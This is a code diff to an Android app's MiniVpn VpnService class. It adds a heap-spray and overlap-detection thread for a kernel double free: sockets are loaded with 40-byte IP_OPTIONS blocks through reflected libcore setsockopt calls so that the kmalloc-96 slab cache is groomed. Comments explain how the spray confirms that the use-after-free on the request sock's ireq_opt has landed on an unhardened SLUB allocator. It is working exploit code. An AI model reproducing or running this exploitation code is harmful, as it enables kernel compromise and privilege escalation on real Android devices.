@@ -5,12 +5,16 @@ import android.net.VpnService;
 import android.os.ParcelFileDescriptor;
 import android.util.Log;
 
+import java.io.FileDescriptor;
 import java.io.FileOutputStream;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
 import java.net.InetAddress;
 import java.net.InetSocketAddress;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.nio.channels.SocketChannel;
+import java.util.Arrays;
 import java.util.concurrent.atomic.AtomicLong;
 
 /**
@@ -68,7 +72,7 @@ public class MiniVpn extends VpnService implements Runnable {
      * rarer, because that window is a few microseconds while the request sock
      * itself lives for hundreds. More workers is the only lever that scales.
      */
-    static final int WORKERS = 4;
+    static final int WORKERS = 3;
 
     static volatile String status = "idle";
     static final AtomicLong rounds = new AtomicLong();
@@ -76,6 +80,10 @@ public class MiniVpn extends VpnService implements Runnable {
     static final AtomicLong rstCount = new AtomicLong();
     static final AtomicLong errCount = new AtomicLong();
     static final AtomicLong bindFail = new AtomicLong();
+    /** How many churn slots were found holding somebody else's marker. */
+    static final AtomicLong overlap = new AtomicLong();
+    /** Slots kept alive by the kmalloc-96 churn detector. */
+    static final int RING = 64;
 
     private ParcelFileDescriptor pfd;
     private FileOutputStream fos;
@@ -132,6 +140,150 @@ public class MiniVpn extends VpnService implements Runnable {
             }, "conn" + w);
             conn.start();
         }
+
+        Thread detect = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                churnLoop();
+            }
+        }, "churn");
+        detect.start();
+    }
+
+    /**
+     * kmalloc-96 overlap detector.
+     *
+     * An ip_options_rcu is 72 bytes (rcu_head 16 + ip_options 56), so a 40-byte
+     * IP_OPTIONS block lands in kmalloc-96 -- the same cache as the request
+     * sock's ireq_opt that the double free targets. Each churned socket gets a
+     * unique marker written into the RR route area; a fresh allocation is made
+     * on every iteration so that if the freelist ever hands the same object out
+     * twice, one slot's marker overwrites the neighbour's and we can see it.
+     *
+     * This is the only way to prove the UAF actually landed: SLUB here has
+     * neither FREELIST_HARDENED nor BUG_ON_DATA_CORRUPTION, and /proc/slabinfo
+     * is not readable from this domain, so nothing crashes and nothing counts.
+     */
+    private void churnLoop() {
+        Socket[] socks = new Socket[RING];
+        ParcelFileDescriptor[] pfds = new ParcelFileDescriptor[RING];
+        FileDescriptor[] fds = new FileDescriptor[RING];
+        byte[][] marks = new byte[RING][];
+
+        Object os = libcoreOs();
+        if (os == null) {
+            status = "no libcore";
+            return;
+        }
+
+        int pos = 0;
+        int counter = 0;
+        while (running) {
+            Socket s = null;
+            ParcelFileDescriptor p = null;
+            try {
+                s = new Socket();
+                p = ParcelFileDescriptor.fromSocket(s);
+                FileDescriptor fd = p.getFileDescriptor();
+                byte[] opt = makeOpt(counter);
+                if (!setsockoptBytes(os, fd, opt)) {
+                    closeQuiet(p);
+                    closeQuiet(s);
+                    errCount.incrementAndGet();
+                    continue;
+                }
+
+                /* Did the slot we are about to evict keep its own marker? */
+                if (socks[pos] != null && marks[pos] != null) {
+                    byte[] cur = getsockoptBytes(os, fds[pos]);
+                    if (cur != null && !Arrays.equals(cur, marks[pos])) {
+                        overlap.incrementAndGet();
+                        Log.w(TAG, "OVERLAP slot=" + pos
+                                + " expected=" + hex(marks[pos])
+                                + " actual=" + hex(cur));
+                    }
+                    closeQuiet(pfds[pos]);
+                    closeQuiet(socks[pos]);
+                }
+
+                socks[pos] = s;
+                pfds[pos] = p;
+                fds[pos] = p.getFileDescriptor();
+                marks[pos] = opt;
+                s = null;
+                p = null;
+
+                pos = (pos + 1) % RING;
+                counter++;
+            } catch (Throwable t) {
+                closeQuiet(p);
+                closeQuiet(s);
+            }
+        }
+    }
+
+    /** 40-byte IP option block: NOP + RR(39), marker in the route area. */
+    static byte[] makeOpt(int idx) {
+        byte[] o = new byte[40];
+        o[0] = 1;
+        o[1] = 7;
+        o[2] = 39;
+        o[3] = 4;
+        o[4] = (byte) (idx & 0xff);
+        o[5] = (byte) ((idx >> 8) & 0xff);
+        o[6] = (byte) ((idx >> 16) & 0xff);
+        o[7] = (byte) ((idx >> 24) & 0xff);
+        return o;
+    }
+
+    private static Object libcoreOsCache;
+    private static boolean libcoreTried;
+
+    static Object libcoreOs() {
+        if (libcoreTried) {
+            return libcoreOsCache;
+        }
+        libcoreTried = true;
+        try {
+            Class<?> c = Class.forName("libcore.io.Libcore");
+            Field f = c.getField("os");
+            libcoreOsCache = f.get(null);
+        } catch (Throwable t) {
+            Log.e(TAG, "libcore lookup failed", t);
+        }
+        return libcoreOsCache;
+    }
+
+    static boolean setsockoptBytes(Object os, FileDescriptor fd, byte[] data) {
+        try {
+            Method m = os.getClass().getMethod("setsockoptBytes",
+                    FileDescriptor.class, int.class, int.class, byte[].class);
+            m.invoke(os, fd, 0 /* IPPROTO_IP */, 4 /* IP_OPTIONS */, data);
+            return true;
+        } catch (Throwable t) {
+            return false;
+        }
+    }
+
+    static byte[] getsockoptBytes(Object os, FileDescriptor fd) {
+        try {
+            Method m = os.getClass().getMethod("getsockoptBytes",
+                    FileDescriptor.class, int.class, int.class);
+            return (byte[]) m.invoke(os, fd, 0, 4);
+        } catch (Throwable t) {
+            return null;
+        }
+    }
+
+    static String hex(byte[] b) {
+        if (b == null) {
+            return "null";
+        }
+        StringBuilder sb = new StringBuilder(b.length * 2);
+        for (byte x : b) {
+            sb.append(String.format("%02x", x));
+        }
+        return sb.toString();
     }
 
     /**
